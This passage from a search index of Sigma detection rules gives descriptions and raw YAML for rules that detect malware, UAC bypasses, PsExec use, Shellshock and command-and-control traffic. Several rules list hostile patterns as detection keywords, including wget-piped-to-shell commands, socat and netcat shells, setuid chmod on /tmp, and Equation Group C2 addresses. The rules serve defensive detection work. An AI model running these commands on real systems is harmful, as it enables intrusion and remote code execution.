rule for SQL exceptions in Python according to PEP 249\nKnown false-positives Application bugs Penetration testing References https://www.python.org/dev/peps/pep-0249/#exceptions Raw rule (edit) title: Python SQL Exceptions id: 19aefed0-ffd4-47dc-a7fc-f8b1425e84f9 status: stable description: Generic rule for SQL exceptions in Python according to PEP 249 author: Thomas Patzke date: 2017/08/12 modified: 2020/09/01 references: - https://www.python.org/dev/peps/pep-0249/#exceptions logsource: category: application product: python detection: exceptions: - DataError - IntegrityError - ProgrammingError - OperationalError condition: exceptions falsepositives: - Application bugs - Penetration testing level: medium tags: - attack.initial_access - attack.t1190 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/application/python/app_python_sql_exceptions.yml/","tags":["attack.initial_access","attack.t1190"],"title":"Python SQL Exceptions"},{"categories":null,"contents":"Detects a ZxShell start by the called and well-known function name\nKnown false-positives Unlikely References https://www.hybrid-analysis.com/sample/5d2a4cde9fa7c2fdbf39b2e2ffd23378d0c50701a3095d1e91e3cf922d7b0b16?environmentId=100 Raw rule (edit) title: ZxShell Malware id: f0b70adb-0075-43b0-9745-e82a1c608fcc status: test description: Detects a ZxShell start by the called and well-known function name author: Florian Roth, oscd.community, Jonhnathan Ribeiro references: - https://www.hybrid-analysis.com/sample/5d2a4cde9fa7c2fdbf39b2e2ffd23378d0c50701a3095d1e91e3cf922d7b0b16?environmentId=100 date: 2017/07/20 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: Image|endswith: - \u0026#39;\\rundll32.exe\u0026#39; CommandLine|contains: - \u0026#39;zxFunction\u0026#39; - \u0026#39;RemoteDiskXXXXX\u0026#39; condition: selection fields: - CommandLine - ParentCommandLine falsepositives: - Unlikely level: critical tags: - attack.execution - attack.t1059.003 - attack.defense_evasion - attack.t1218.011 - attack.s0412 - attack.g0001 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_apt_zxshell.yml/","tags":["attack.execution","attack.t1059.003","attack.defense_evasion","attack.t1218.011","attack.s0412","attack.g0001"],"title":"ZxShell Malware"},{"categories":null,"contents":"Detects suspicious SSH / SSHD error messages that indicate a fatal or suspicious error that could be caused by exploiting attempts\nKnown false-positives Unknown References https://github.com/openssh/openssh-portable/blob/master/ssherr.c https://github.com/ossec/ossec-hids/blob/master/etc/rules/sshd_rules.xml Raw rule (edit) title: Suspicious OpenSSH Daemon Error id: e76b413a-83d0-4b94-8e4c-85db4a5b8bdc status: test description: Detects suspicious SSH / SSHD error messages that indicate a fatal or suspicious error that could be caused by exploiting attempts author: Florian Roth references: - https://github.com/openssh/openssh-portable/blob/master/ssherr.c - https://github.com/ossec/ossec-hids/blob/master/etc/rules/sshd_rules.xml date: 2017/06/30 modified: 2021/11/27 logsource: product: linux service: sshd detection: keywords: - \u0026#39;*unexpected internal error*\u0026#39; - \u0026#39;*unknown or unsupported key type*\u0026#39; - \u0026#39;*invalid certificate signing key*\u0026#39; - \u0026#39;*invalid elliptic curve value*\u0026#39; - \u0026#39;*incorrect signature*\u0026#39; - \u0026#39;*error in libcrypto*\u0026#39; - \u0026#39;*unexpected bytes remain after decoding*\u0026#39; - \u0026#39;*fatal: buffer_get_string: bad string*\u0026#39; - \u0026#39;*Local: crc32 compensation attack*\u0026#39; - \u0026#39;*bad client public DH value*\u0026#39; - \u0026#39;*Corrupted MAC on input*\u0026#39; condition: keywords falsepositives: - Unknown level: medium tags: - attack.initial_access - attack.t1190 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/linux/other/lnx_susp_ssh.yml/","tags":["attack.initial_access","attack.t1190"],"title":"Suspicious OpenSSH Daemon Error"},{"categories":null,"contents":"Detects renaming of file while deletion with SDelete tool.\nKnown false-positives Legitimate usage of SDelete References https://jpcertcc.github.io/ToolAnalysisResultSheet/details/sdelete.htm https://www.jpcert.or.jp/english/pub/sr/ir_research.html https://docs.microsoft.com/en-gb/sysinternals/downloads/sdelete Raw rule (edit) title: Secure Deletion with SDelete id: 39a80702-d7ca-4a83-b776-525b1f86a36d status: test description: Detects renaming of file while deletion with SDelete tool. author: Thomas Patzke references: - https://jpcertcc.github.io/ToolAnalysisResultSheet/details/sdelete.htm - https://www.jpcert.or.jp/english/pub/sr/ir_research.html - https://docs.microsoft.com/en-gb/sysinternals/downloads/sdelete date: 2017/06/14 modified: 2021/11/27 logsource: product: windows service: security detection: selection: EventID: - 4656 - 4663 - 4658 ObjectName|endswith: - \u0026#39;.AAA\u0026#39; - \u0026#39;.ZZZ\u0026#39; condition: selection falsepositives: - Legitimate usage of SDelete level: medium tags: - attack.impact - attack.defense_evasion - attack.t1070.004 - attack.t1027.005 - attack.t1485 - attack.t1553.002 - attack.s0195 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/builtin/security/win_susp_sdelete.yml/","tags":["attack.impact","attack.defense_evasion","attack.t1070.004","attack.t1027.005","attack.t1485","attack.t1553.002","attack.s0195"],"title":"Secure Deletion with SDelete"},{"categories":null,"contents":"Detects wceaux.dll access while WCE pass-the-hash remote command execution on source host\nKnown false-positives Penetration testing References https://www.jpcert.or.jp/english/pub/sr/ir_research.html https://jpcertcc.github.io/ToolAnalysisResultSheet Raw rule (edit) title: WCE wceaux.dll Access id: 1de68c67-af5c-4097-9c85-fe5578e09e67 status: test description: Detects wceaux.dll access while WCE pass-the-hash remote command execution on source host author: Thomas Patzke references: - https://www.jpcert.or.jp/english/pub/sr/ir_research.html - https://jpcertcc.github.io/ToolAnalysisResultSheet date: 2017/06/14 modified: 2021/11/27 logsource: product: windows service: security detection: selection: EventID: - 4656 - 4658 - 4660 - 4663 ObjectName|endswith: \u0026#39;\\wceaux.dll\u0026#39; condition: selection falsepositives: - Penetration testing level: critical tags: - attack.credential_access - attack.t1003 - attack.s0005 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/builtin/security/win_mal_wceaux_dll.yml/","tags":["attack.credential_access","attack.t1003","attack.s0005"],"title":"WCE wceaux.dll Access"},{"categories":null,"contents":"Detects PsExec service installation and execution events (service and Sysmon)\nKnown false-positives unknown References https://www.jpcert.or.jp/english/pub/sr/ir_research.html https://jpcertcc.github.io/ToolAnalysisResultSheet Raw rule (edit) title: PsExec Tool Execution id: 42c575ea-e41e-41f1-b248-8093c3e82a28 status: experimental description: Detects PsExec service installation and execution events (service and Sysmon) author: Thomas Patzke date: 2017/06/12 modified: 2021/09/21 references: - https://www.jpcert.or.jp/english/pub/sr/ir_research.html - https://jpcertcc.github.io/ToolAnalysisResultSheet tags: - attack.execution - attack.t1569.002 - attack.s0029 fields: - EventID - CommandLine - ParentCommandLine - ServiceName - ServiceFileName - TargetFilename - PipeName logsource: product: windows service: system detection: service_installation: EventID: 7045 ServiceName: \u0026#39;PSEXESVC\u0026#39; ServiceFileName|endswith: \u0026#39;\\PSEXESVC.exe\u0026#39; service_execution: EventID: 7036 ServiceName: \u0026#39;PSEXESVC\u0026#39; condition: service_installation or service_execution falsepositives: - unknown level: low ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/builtin/system/win_tool_psexec.yml/","tags":["attack.execution","attack.t1569.002","attack.s0029"],"title":"PsExec Tool Execution"},{"categories":null,"contents":"Detects the installation of a Callout DLL via CalloutDlls and CalloutEnabled parameter in Registry, which can be used to execute code in context of the DHCP server (restart required)\nKnown false-positives unknown References https://blog.3or.de/mimilib-dhcp-server-callout-dll-injection.html https://technet.microsoft.com/en-us/library/cc726884(v=ws.10).aspx https://msdn.microsoft.com/de-de/library/windows/desktop/aa363389(v=vs.85).aspx Raw rule (edit) title: DHCP Callout DLL Installation id: 9d3436ef-9476-4c43-acca-90ce06bdf33a status: test description: Detects the installation of a Callout DLL via CalloutDlls and CalloutEnabled parameter in Registry, which can be used to execute code in context of the DHCP server (restart required) author: Dimitrios Slamaris references: - https://blog.3or.de/mimilib-dhcp-server-callout-dll-injection.html - https://technet.microsoft.com/en-us/library/cc726884(v=ws.10).aspx - https://msdn.microsoft.com/de-de/library/windows/desktop/aa363389(v=vs.85).aspx date: 2017/05/15 modified: 2021/11/27 logsource: category: registry_event product: windows detection: selection: TargetObject|endswith: - \u0026#39;\\Services\\DHCPServer\\Parameters\\CalloutDlls\u0026#39; - \u0026#39;\\Services\\DHCPServer\\Parameters\\CalloutEnabled\u0026#39; condition: selection falsepositives: - unknown level: high tags: - attack.defense_evasion - attack.t1574.002 - attack.t1112 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/registry_event/registry_event_dhcp_calloutdll.yml/","tags":["attack.defense_evasion","attack.t1574.002","attack.t1112"],"title":"DHCP Callout DLL Installation"},{"categories":null,"contents":"This rule detects a DHCP server error in which a specified Callout DLL (in registry) could not be loaded\nKnown false-positives Unknown References https://blog.3or.de/mimilib-dhcp-server-callout-dll-injection.html https://technet.microsoft.com/en-us/library/cc726884(v=ws.10).aspx https://msdn.microsoft.com/de-de/library/windows/desktop/aa363389(v=vs.85).aspx Raw rule (edit) title: DHCP Server Error Failed Loading the CallOut DLL id: 75edd3fd-7146-48e5-9848-3013d7f0282c description: This rule detects a DHCP server error in which a specified Callout DLL (in registry) could not be loaded status: experimental references: - https://blog.3or.de/mimilib-dhcp-server-callout-dll-injection.html - https://technet.microsoft.com/en-us/library/cc726884(v=ws.10).aspx - https://msdn.microsoft.com/de-de/library/windows/desktop/aa363389(v=vs.85).aspx date: 2017/05/15 modified: 2021/10/13 tags: - attack.defense_evasion - attack.t1574.002 author: \u0026#39;Dimitrios Slamaris, @atc_project (fix)\u0026#39; logsource: product: windows service: system detection: selection: EventID: - 1031 - 1032 - 1034 Provider_Name: Microsoft-Windows-DHCP-Server condition: selection falsepositives: - Unknown level: critical ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/builtin/system/win_susp_dhcp_config_failed.yml/","tags":["attack.defense_evasion","attack.t1574.002"],"title":"DHCP Server Error Failed Loading the CallOut DLL"},{"categories":null,"contents":"This rule detects a DHCP server in which a specified Callout DLL (in registry) was loaded\nKnown false-positives Unknown References https://blog.3or.de/mimilib-dhcp-server-callout-dll-injection.html https://technet.microsoft.com/en-us/library/cc726884(v=ws.10).aspx https://msdn.microsoft.com/de-de/library/windows/desktop/aa363389(v=vs.85).aspx Raw rule (edit) title: DHCP Server Loaded the CallOut DLL id: 13fc89a9-971e-4ca6-b9dc-aa53a445bf40 status: experimental description: This rule detects a DHCP server in which a specified Callout DLL (in registry) was loaded references: - https://blog.3or.de/mimilib-dhcp-server-callout-dll-injection.html - https://technet.microsoft.com/en-us/library/cc726884(v=ws.10).aspx - https://msdn.microsoft.com/de-de/library/windows/desktop/aa363389(v=vs.85).aspx date: 2017/05/15 modified: 2021/10/13 author: Dimitrios Slamaris tags: - attack.defense_evasion - attack.t1574.002 logsource: product: windows service: system detection: selection: EventID: 1033 Provider_Name: Microsoft-Windows-DHCP-Server condition: selection falsepositives: - Unknown level: critical ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/builtin/system/win_susp_dhcp_config.yml/","tags":["attack.defense_evasion","attack.t1574.002"],"title":"DHCP Server Loaded the CallOut DLL"},{"categories":null,"contents":"Detects backup catalog deletions\nKnown false-positives Unknown References https://technet.microsoft.com/en-us/library/cc742154(v=ws.11).aspx https://www.hybrid-analysis.com/sample/ed01ebfbc9eb5bbea545af4d01bf5f1071661840480439c6e5babe8e080e41aa?environmentId=100 Raw rule (edit) title: Backup Catalog Deleted id: 9703792d-fd9a-456d-a672-ff92efe4806a status: experimental description: Detects backup catalog deletions references: - https://technet.microsoft.com/en-us/library/cc742154(v=ws.11).aspx - https://www.hybrid-analysis.com/sample/ed01ebfbc9eb5bbea545af4d01bf5f1071661840480439c6e5babe8e080e41aa?environmentId=100 author: Florian Roth (rule), Tom U. @c_APT_ure (collection) date: 2017/05/12 modified: 2021/10/13 tags: - attack.defense_evasion - attack.t1070.004 logsource: product: windows service: application detection: selection: EventID: 524 Provider_Name: Microsoft-Windows-Backup condition: selection falsepositives: - Unknown level: medium ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/builtin/application/win_susp_backup_delete.yml/","tags":["attack.defense_evasion","attack.t1070.004"],"title":"Backup Catalog Deleted"},{"categories":null,"contents":"Detects communication to C2 servers mentioned in the operational notes of the ShadowBroker leak of EquationGroup C2 tools\nKnown false-positives Unknown References https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation https://medium.com/@msuiche/the-nsa-compromised-swift-network-50ec3000b195 Raw rule (edit) title: Equation Group C2 Communication id: 881834a4-6659-4773-821e-1c151789d873 status: test description: Detects communication to C2 servers mentioned in the operational notes of the ShadowBroker leak of EquationGroup C2 tools author: Florian Roth references: - https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation - https://medium.com/@msuiche/the-nsa-compromised-swift-network-50ec3000b195 date: 2017/04/15 modified: 2021/11/27 logsource: category: firewall detection: select_outgoing: dst_ip: - \u0026#39;69.42.98.86\u0026#39; - \u0026#39;89.185.234.145\u0026#39; select_incoming: src_ip: - \u0026#39;69.42.98.86\u0026#39; - \u0026#39;89.185.234.145\u0026#39; condition: 1 of select* falsepositives: - Unknown level: high tags: - attack.command_and_control - attack.g0020 - attack.t1041 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/network/net_apt_equationgroup_c2.yml/","tags":["attack.command_and_control","attack.g0020","attack.t1041"],"title":"Equation Group C2 Communication"},{"categories":null,"contents":"This method detects a service install of malicious services mentioned in Carbon Paper - Turla report by ESET\nKnown false-positives Unknown References https://www.welivesecurity.com/2017/03/30/carbon-paper-peering-turlas-second-stage-backdoor/ Raw rule (edit) title: Turla Service Install id: 1df8b3da-b0ac-4d8a-b7c7-6cb7c24160e4 status: test description: This method detects a service install of malicious services mentioned in Carbon Paper - Turla report by ESET author: Florian Roth references: - https://www.welivesecurity.com/2017/03/30/carbon-paper-peering-turlas-second-stage-backdoor/ date: 2017/03/31 modified: 2021/11/30 logsource: product: windows service: system detection: selection: Provider_Name: \u0026#39;Service Control Manager\u0026#39; EventID: 7045 ServiceName: - \u0026#39;srservice\u0026#39; - \u0026#39;ipvpn\u0026#39; - \u0026#39;hkmsvc\u0026#39; condition: selection falsepositives: - Unknown level: high tags: - attack.persistence - attack.g0010 - attack.t1543.003 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/builtin/system/win_apt_carbonpaper_turla.yml/","tags":["attack.persistence","attack.g0010","attack.t1543.003"],"title":"Turla Service Install"},{"categories":null,"contents":"Detects suspicious SAM dump activity as cause by QuarksPwDump and other password dumpers\nKnown false-positives Penetration testing Raw rule (edit) title: SAM Dump to AppData id: 839dd1e8-eda8-4834-8145-01beeee33acd status: test description: Detects suspicious SAM dump activity as cause by QuarksPwDump and other password dumpers author: Florian Roth date: 2018/01/27 modified: 2021/11/27 logsource: product: windows service: system definition: The source of this type of event is Kernel-General detection: selection: EventID: 16 keywords: - \u0026#39;\\AppData\\Local\\Temp\\SAM-\u0026#39; - \u0026#39;.dmp\u0026#39; condition: selection and all of keywords falsepositives: - Penetration testing level: high tags: - attack.credential_access - attack.t1003.002 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/builtin/system/win_susp_sam_dump.yml/","tags":["attack.credential_access","attack.t1003.002"],"title":"SAM Dump to AppData"},{"categories":null,"contents":"Detects suspicious log entries in Linux log files\nKnown false-positives Unknown Raw rule (edit) title: Suspicious Log Entries id: f64b6e9a-5d9d-48a5-8289-e1dd2b3876e1 status: test description: Detects suspicious log entries in Linux log files author: Florian Roth date: 2017/03/25 modified: 2021/11/27 logsource: product: linux detection: keywords: - entered promiscuous mode - Deactivating service - Oversized packet received from - imuxsock begins to drop messages condition: keywords falsepositives: - Unknown level: medium tags: - attack.impact ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/linux/builtin/lnx_shell_susp_log_entries.yml/","tags":["attack.impact"],"title":"Suspicious Log Entries"},{"categories":null,"contents":"Detects PowerShell downgrade attack by comparing the host versions with the actually used engine version 2.0\nKnown false-positives Penetration Test Unknown References http://www.leeholmes.com/blog/2017/03/17/detecting-and-preventing-powershell-downgrade-attacks/ Raw rule (edit) title: PowerShell Downgrade Attack id: 6331d09b-4785-4c13-980f-f96661356249 status: experimental description: Detects PowerShell downgrade attack by comparing the host versions with the actually used engine version 2.0 references: - http://www.leeholmes.com/blog/2017/03/17/detecting-and-preventing-powershell-downgrade-attacks/ tags: - attack.defense_evasion - attack.execution - attack.t1059.001 author: Florian Roth (rule), Lee Holmes (idea), Harish Segar (improvements) date: 2017/03/22 modified: 2021/10/16 logsource: product: windows category: ps_classic_start definition: fields have to be extract from event detection: selection: EngineVersion|startswith: \u0026#39;2.\u0026#39; filter: HostVersion|startswith: \u0026#39;2.\u0026#39; condition: selection and not filter falsepositives: - Penetration Test - Unknown level: medium ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/powershell/powershell_classic/posh_pc_downgrade_attack.yml/","tags":["attack.defense_evasion","attack.execution","attack.t1059.001"],"title":"PowerShell Downgrade Attack"},{"categories":null,"contents":"Detects UAC bypass method using Windows event viewer\nKnown false-positives unknown References https://enigma0x3.net/2016/08/15/fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking/ https://www.hybrid-analysis.com/sample/e122bc8bf291f15cab182a5d2d27b8db1e7019e4e96bb5cdbd1dfe7446f3f51f?environmentId=100 Raw rule (edit) title: UAC Bypass via Event Viewer id: 7c81fec3-1c1d-43b0-996a-46753041b1b6 status: experimental description: Detects UAC bypass method using Windows event viewer references: - https://enigma0x3.net/2016/08/15/fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking/ - https://www.hybrid-analysis.com/sample/e122bc8bf291f15cab182a5d2d27b8db1e7019e4e96bb5cdbd1dfe7446f3f51f?environmentId=100 author: Florian Roth date: 2017/03/19 modified: 2021/09/12 logsource: product: windows category: registry_event detection: methregistry: TargetObject|startswith: \u0026#39;HKCU\\\u0026#39; TargetObject|endswith: \u0026#39;\\mscfile\\shell\\open\\command\u0026#39; condition: methregistry falsepositives: - unknown level: critical tags: - attack.defense_evasion - attack.privilege_escalation - attack.t1548.002 - car.2019-04-001 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/registry_event/registry_event_uac_bypass_eventvwr.yml/","tags":["attack.defense_evasion","attack.privilege_escalation","attack.t1548.002","car.2019-04-001"],"title":"UAC Bypass via Event Viewer"},{"categories":null,"contents":"Detects programs that connect to typical malware back connect ports based on statistical analysis from two different sandbox system databases\nKnown false-positives unknown References https://docs.google.com/spreadsheets/d/17pSTDNpa0sf6pHeRhusvWG6rThciE8CsXTSlDUAZDyo Raw rule (edit) title: Suspicious Typical Malware Back Connect Ports id: 4b89abaa-99fe-4232-afdd-8f9aa4d20382 status: test description: Detects programs that connect to typical malware back connect ports based on statistical analysis from two different sandbox system databases author: Florian Roth references: - https://docs.google.com/spreadsheets/d/17pSTDNpa0sf6pHeRhusvWG6rThciE8CsXTSlDUAZDyo date: 2017/03/19 modified: 2022/02/02 logsource: category: network_connection product: windows definition: \u0026#39;Use the following config to generate the necessary Event ID 10 Process Access events: \u0026lt;ProcessAccess onmatch=\u0026#34;include\u0026#34;\u0026gt;\u0026lt;CallTrace condition=\u0026#34;contains\u0026#34;\u0026gt;VBE7.DLL\u0026lt;/CallTrace\u0026gt;\u0026lt;/ProcessAccess\u0026gt;\u0026lt;ProcessAccess onmatch=\u0026#34;exclude\u0026#34;\u0026gt;\u0026lt;CallTrace condition=\u0026#34;excludes\u0026#34;\u0026gt;UNKNOWN\u0026lt;/CallTrace\u0026gt;\u0026lt;/ProcessAccess\u0026gt;\u0026#39; detection: selection: Initiated: \u0026#39;true\u0026#39; DestinationPort: - \u0026#39;4443\u0026#39; - \u0026#39;2448\u0026#39; - \u0026#39;8143\u0026#39; - \u0026#39;1777\u0026#39; - \u0026#39;1443\u0026#39; - \u0026#39;243\u0026#39; - \u0026#39;65535\u0026#39; - \u0026#39;13506\u0026#39; - \u0026#39;3360\u0026#39; - \u0026#39;200\u0026#39; - \u0026#39;198\u0026#39; - \u0026#39;49180\u0026#39; - \u0026#39;13507\u0026#39; - \u0026#39;6625\u0026#39; - \u0026#39;4444\u0026#39; - \u0026#39;4438\u0026#39; - \u0026#39;1904\u0026#39; - \u0026#39;13505\u0026#39; - \u0026#39;13504\u0026#39; - \u0026#39;12102\u0026#39; - \u0026#39;9631\u0026#39; - \u0026#39;5445\u0026#39; - \u0026#39;2443\u0026#39; - \u0026#39;777\u0026#39; - \u0026#39;13394\u0026#39; - \u0026#39;13145\u0026#39; - \u0026#39;12103\u0026#39; - \u0026#39;5552\u0026#39; - \u0026#39;3939\u0026#39; - \u0026#39;3675\u0026#39; - \u0026#39;666\u0026#39; - \u0026#39;473\u0026#39; - \u0026#39;5649\u0026#39; - \u0026#39;4455\u0026#39; - \u0026#39;4433\u0026#39; - \u0026#39;1817\u0026#39; - \u0026#39;100\u0026#39; - \u0026#39;65520\u0026#39; - \u0026#39;1960\u0026#39; - \u0026#39;1515\u0026#39; - \u0026#39;743\u0026#39; - \u0026#39;700\u0026#39; - \u0026#39;14154\u0026#39; - \u0026#39;14103\u0026#39; - \u0026#39;14102\u0026#39; - \u0026#39;12322\u0026#39; - \u0026#39;10101\u0026#39; - \u0026#39;7210\u0026#39; - \u0026#39;4040\u0026#39; - \u0026#39;9943\u0026#39; filter1: Image|contains: \u0026#39;\\Program Files\u0026#39; filter2: DestinationIp|startswith: - \u0026#39;10.\u0026#39; - \u0026#39;192.168.\u0026#39; - \u0026#39;172.16.\u0026#39; - \u0026#39;172.17.\u0026#39; - \u0026#39;172.18.\u0026#39; - \u0026#39;172.19.\u0026#39; - \u0026#39;172.20.\u0026#39; - \u0026#39;172.21.\u0026#39; - \u0026#39;172.22.\u0026#39; - \u0026#39;172.23.\u0026#39; - \u0026#39;172.24.\u0026#39; - \u0026#39;172.25.\u0026#39; - \u0026#39;172.26.\u0026#39; - \u0026#39;172.27.\u0026#39; - \u0026#39;172.28.\u0026#39; - \u0026#39;172.29.\u0026#39; - \u0026#39;172.30.\u0026#39; - \u0026#39;172.31.\u0026#39; - \u0026#39;127.\u0026#39; condition: selection and not 1 of filter* falsepositives: - unknown level: medium tags: - attack.command_and_control - attack.t1571 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/network_connection/net_connection_win_malware_backconnect_ports.yml/","tags":["attack.command_and_control","attack.t1571"],"title":"Suspicious Typical Malware Back Connect Ports"},{"categories":null,"contents":"Detects the pattern of UAC Bypass using registry key manipulation of sdclt.exe (e.g. UACMe 53)\nKnown false-positives unknown References https://enigma0x3.net/2017/03/17/fileless-uac-bypass-using-sdclt-exe/ https://github.com/hfiref0x/UACME Raw rule (edit) title: UAC Bypass via Sdclt id: 5b872a46-3b90-45c1-8419-f675db8053aa status: experimental description: Detects the pattern of UAC Bypass using registry key manipulation of sdclt.exe (e.g. UACMe 53) references: - https://enigma0x3.net/2017/03/17/fileless-uac-bypass-using-sdclt-exe/ - https://github.com/hfiref0x/UACME author: Omer Yampel, Christian Burkard date: 2017/03/17 modified: 2022/01/13 logsource: category: registry_event product: windows detection: selection1: TargetObject|endswith: Software\\Classes\\exefile\\shell\\runas\\command\\isolatedCommand selection2: EventType: SetValue TargetObject|endswith: Software\\Classes\\Folder\\shell\\open\\command\\SymbolicLinkValue Details|contains: \u0026#39;-1???\\Software\\Classes\\\u0026#39; condition: 1 of selection* falsepositives: - unknown level: high tags: - attack.defense_evasion - attack.privilege_escalation - attack.t1548.002 - car.2019-04-001 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/registry_event/registry_event_uac_bypass_sdclt.yml/","tags":["attack.defense_evasion","attack.privilege_escalation","attack.t1548.002","car.2019-04-001"],"title":"UAC Bypass via Sdclt"},{"categories":null,"contents":"Detects interactive console logons to Server Systems\nKnown false-positives Administrative activity via KVM or ILO board Raw rule (edit) title: Interactive Logon to Server Systems id: 3ff152b2-1388-4984-9cd9-a323323fdadf status: test description: Detects interactive console logons to Server Systems author: Florian Roth date: 2017/03/17 modified: 2021/11/27 logsource: product: windows service: security detection: selection: EventID: - 528 - 529 - 4624 - 4625 LogonType: 2 ComputerName: - \u0026#39;%ServerSystems%\u0026#39; - \u0026#39;%DomainControllers%\u0026#39; filter: LogonProcessName: Advapi ComputerName: \u0026#39;%Workstations%\u0026#39; condition: selection and not filter falsepositives: - Administrative activity via KVM or ILO board level: medium tags: - attack.lateral_movement - attack.t1078 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/builtin/security/win_susp_interactive_logons.yml/","tags":["attack.lateral_movement","attack.t1078"],"title":"Interactive Logon to Server Systems"},{"categories":null,"contents":"Detects suspicious shell commands used in various exploit codes (see references)\nKnown false-positives Unknown References http://www.threatgeek.com/2017/03/widespread-exploitation-attempts-using-cve-2017-5638.html https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/multi/http/struts_code_exec_exception_delegator.rb#L121 http://pastebin.com/FtygZ1cg https://artkond.com/2017/03/23/pivoting-guide/ Raw rule (edit) title: Suspicious Activity in Shell Commands id: 2aa1440c-9ae9-4d92-84a7-a9e5f5e31695 status: test description: Detects suspicious shell commands used in various exploit codes (see references) author: Florian Roth references: - http://www.threatgeek.com/2017/03/widespread-exploitation-attempts-using-cve-2017-5638.html - https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/multi/http/struts_code_exec_exception_delegator.rb#L121 - http://pastebin.com/FtygZ1cg - https://artkond.com/2017/03/23/pivoting-guide/ date: 2017/08/21 modified: 2021/11/27 logsource: product: linux detection: keywords: # Generic suspicious commands - \u0026#39;wget * - http* | perl\u0026#39; - \u0026#39;wget * - http* | sh\u0026#39; - \u0026#39;wget * - http* | bash\u0026#39; - \u0026#39;python -m SimpleHTTPServer\u0026#39; - \u0026#39;-m http.server\u0026#39; # Python 3 - \u0026#39;import pty; pty.spawn*\u0026#39; - \u0026#39;socat exec:*\u0026#39; - \u0026#39;socat -O /tmp/*\u0026#39; - \u0026#39;socat tcp-connect*\u0026#39; - \u0026#39;*echo binary \u0026gt;\u0026gt;*\u0026#39; # Malware - \u0026#39;*wget *; chmod +x*\u0026#39; - \u0026#39;*wget *; chmod 777 *\u0026#39; - \u0026#39;*cd /tmp || cd /var/run || cd /mnt*\u0026#39; # Apache Struts in-the-wild exploit codes - \u0026#39;*stop;service iptables stop;*\u0026#39; - \u0026#39;*stop;SuSEfirewall2 stop;*\u0026#39; - \u0026#39;chmod 777 2020*\u0026#39; - \u0026#39;*\u0026gt;\u0026gt;/etc/rc.local\u0026#39; # Metasploit framework exploit codes - \u0026#39;*base64 -d /tmp/*\u0026#39; - \u0026#39;* | base64 -d *\u0026#39; - \u0026#39;*/chmod u+s *\u0026#39; - \u0026#39;*chmod +s /tmp/*\u0026#39; - \u0026#39;*chmod u+s /tmp/*\u0026#39; - \u0026#39;* /tmp/haxhax*\u0026#39; - \u0026#39;* /tmp/ns_sploit*\u0026#39; - \u0026#39;nc -l -p *\u0026#39; - \u0026#39;cp /bin/ksh *\u0026#39; - \u0026#39;cp /bin/sh *\u0026#39; - \u0026#39;* /tmp/*.b64 *\u0026#39; - \u0026#39;*/tmp/ysocereal.jar*\u0026#39; - \u0026#39;*/tmp/x *\u0026#39; - \u0026#39;*; chmod +x /tmp/*\u0026#39; - \u0026#39;*;chmod +x /tmp/*\u0026#39; condition: keywords falsepositives: - Unknown level: high tags: - attack.execution - attack.t1059.004 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/linux/builtin/lnx_shell_susp_commands.yml/","tags":["attack.execution","attack.t1059.004"],"title":"Suspicious Activity in Shell Commands"},{"categories":null,"contents":"Detects shellshock expressions in log files\nKnown false-positives Unknown References https://owasp.org/www-pdf-archive/Shellshock_-_Tudor_Enache.pdf Raw rule (edit) title: Shellshock Expression id: c67e0c98-4d39-46ee-8f6b-437ebf6b950e status: experimental description: Detects shellshock expressions in log files author: Florian Roth date: 2017/03/14 modified: 2021/04/28 references: - https://owasp.org/www-pdf-archive/Shellshock_-_Tudor_Enache.pdf logsource: product: linux detection: keyword: - \u0026#39;(){:;};\u0026#39; - \u0026#39;() {:;};\u0026#39; - \u0026#39;() { :;};\u0026#39; - \u0026#39;() { :; };\u0026#39; condition: keyword falsepositives: - Unknown level: high tags: - attack.persistence - attack.t1505.003 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/linux/builtin/lnx_shellshock.yml/","tags":["attack.persistence","attack.t1505.003"],"title":"Shellshock Expression"},{"categories":null,"contents":"Detects access to $ADMIN share\nKnown false-positives Legitimate administrative activity Raw rule (edit) title: Access to ADMIN$ Share id: 098d7118-55bc-4912-a836-dc6483a8d150 status: test description: Detects access to $ADMIN share author: Florian Roth date: 2017/03/04 modified: 2021/11/27 logsource: product: windows service: security definition: \u0026#39;The advanced audit policy setting \u0026#34;Object Access \u0026gt; Audit File Share\u0026#34; must be configured for Success/Failure\u0026#39; detection: selection: EventID: 5140 ShareName: Admin$ filter: SubjectUserName|endswith: \u0026#39;$\u0026#39; condition: selection and not filter falsepositives: - Legitimate administrative activity level: low tags: - attack.lateral_movement - attack.t1021.002 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/builtin/security/win_admin_share_access.yml/","tags":["attack.lateral_movement","attack.t1021.002"],"title":"Access to ADMIN$ Share"},{"categories":null,"contents":"This rule triggers on user accounts that are added to the local Administrators group, which could be legitimate activity or a sign of privilege escalation activity\nKnown false-positives Legitimate administrative activity Raw rule (edit) title: User Added to Local Administrators id: c265cf08-3f99-46c1-8d59-328247057d57 description: This rule triggers on user accounts that are added to the local Administrators group, which could be legitimate activity or a sign of privilege escalation activity status: stable author: Florian Roth date: 2017/03/14 modified: 2021/01/17 